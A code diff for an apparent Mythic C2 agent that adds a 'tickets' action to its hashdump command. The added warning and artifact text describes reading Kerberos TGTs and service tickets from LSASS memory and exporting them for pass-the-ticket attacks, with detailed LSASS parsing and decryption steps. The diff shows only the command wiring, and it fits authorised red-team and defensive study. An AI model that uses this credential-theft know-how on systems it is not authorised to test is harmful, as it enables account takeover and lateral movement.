@@ -37,7 +37,7 @@ func init() {
 				CLIName:          "action",
 				ModalDisplayName: "Action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"dump", "insitu", "insitu-full", "auto-spray"},
+				Choices:          []string{"dump", "insitu", "insitu-full", "tickets", "auto-spray"},
 				Description:      "dump: extract local hashes from SAM (requires SYSTEM, Windows only). insitu: enumerate active logon sessions via LSA APIs in-process (requires admin, Windows only). insitu-full: open lsass.exe with PROCESS_VM_READ, sigscan lsasrv.dll for LogonSessionList, walk the linked list, parse each node's KIWI_MSV1_0_LIST_63 fields (LUID, UserName, Domain, AuthPackage, LogonType, Credentials-pointer), walk the credentials_ptr chain to capture each KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope, sigscan LsaInitializeProtectedMemory_Internal to recover the IV / h3DesKey / hAesKey BCrypt key globals + raw 16-byte IV / 24-byte 3DES / 32-byte AES key bytes, AES-256-CFB / 3DES-CBC decrypt every captured ciphertext blob, and overlay the KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW layout to extract NT/LM/SHA hashes (Phase 2B + 2C-i + 2C-ii-a + 2C-ii-b + 2C-ii-c, Win10 21H2 / Win11 23H2 layout) — emits `username:rid:lm:nt:::` lines compatible with the dump-action ProcessResponse credential-vault registration. Requires admin, Windows only. auto-spray: dump hashes then spray them against target hosts via cred-check.",
 				DefaultValue:     "dump",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
@@ -82,6 +82,8 @@ func init() {
 			var msg string
 			if action == "insitu" {
 				msg = "OPSEC WARNING: hashdump -action insitu calls LsaEnumerateLogonSessions/LsaGetLogonSessionData in-process. No remote handle to lsass.exe is opened (Phase 1 — LSA API only). Requires administrator privileges for full visibility across all sessions."
+			} else if action == "tickets" {
+				msg = "OPSEC WARNING: hashdump -action tickets opens lsass.exe with PROCESS_VM_READ, reads the kerberos.dll image, and sigscan for KerbGlobalLogonSessionTable. It then walks the Kerberos session list and reads raw ticket data (TGTs and service tickets) from each session. Process handle to LSASS is the highest-fidelity EDR signal. Requires administrator privileges. Exports tickets in .kirbi format (base64) for pass-the-ticket attacks."
 			} else if action == "insitu-full" {
 				msg = "OPSEC WARNING: hashdump -action insitu-full opens lsass.exe with PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION and calls ReadProcessMemory across the lsasrv.dll image, every walked LogonSessionList node, every LSA_UNICODE_STRING.Buffer dereference for username/domain/auth-package strings, every KIWI_MSV1_0_CREDENTIAL_LIST entry + KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope reachable from credentials_ptr (Phase 2C-ii-a), AND the IV global + h3DesKey/hAesKey KIWI_BCRYPT_HANDLE_KEY → KIWI_BCRYPT_KEY81 → KIWI_HARD_KEY chain reachable from LsaInitializeProtectedMemory_Internal (Phase 2C-ii-b — recovers raw 16-byte IV + 24-byte 3DES + 32-byte AES key bytes). Phase 2C-ii-c then AES-256-CFB / 3DES-CBC decrypts every captured ciphertext blob in-process and overlays the KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW layout to extract NT/LM/SHA hashes — output includes `username:rid:lm:nt:::` lines that the dump-action ProcessResponse parser will register in the credential vault. Process handle to LSASS is the highest-fidelity EDR signal available — equivalent to mimikatz/dumpit on most modern EDR. Requires administrator privileges; on Win11 22H2+ default RunAsPPL=2 (PPL with UEFI variable lock) blocks PROCESS_VM_READ even from SYSTEM — the agent now reads HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL+LsaCfgFlags BEFORE OpenProcess and emits a structured `lsass_protection` JSON report so PPL/Credential Guard blocks are distinguishable from layout drift. Signature + KIWI_MSV1_0_LIST_63 + CREDENTIAL_LIST + LsaInitializeProtectedMemory + PRIMARY_CREDENTIAL_10_NEW layouts calibrated for Win10 21H2 — Win11 23H2; older builds may emit 'signature not found' or report walked nodes with empty parsed_username/parsed_domain or invalid BCrypt key tags (layout drift). Decryption is the operationally-loud step — recovered hashes will appear in operator output; do NOT run on production endpoints without explicit engagement scope."
 			} else {
@@ -176,6 +178,17 @@ func init() {
 					TaskID:           taskData.Task.ID,
 					BaseArtifactType: "API Call",
 					ArtifactMessage:  "LsaEnumerateLogonSessions + LsaGetLogonSessionData (active logon session metadata from live LSASS)",
+				})
+				return response
+			}
+
+			if action == "tickets" {
+				display := "Kerberos ticket extraction (sigscan kerberos.dll + KerbGlobalLogonSessionTable walk + .kirbi export)"
+				response.DisplayParams = &display
+				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
+					TaskID:           taskData.Task.ID,
+					BaseArtifactType: "API Call",
+					ArtifactMessage:  "OpenProcess(lsass.exe, PROCESS_VM_READ) + ReadProcessMemory(kerberos.dll image) + sigscan KerbGlobalLogonSessionTable + walk Kerberos session list + extract TGTs and service tickets",
 				})
 				return response
 			}
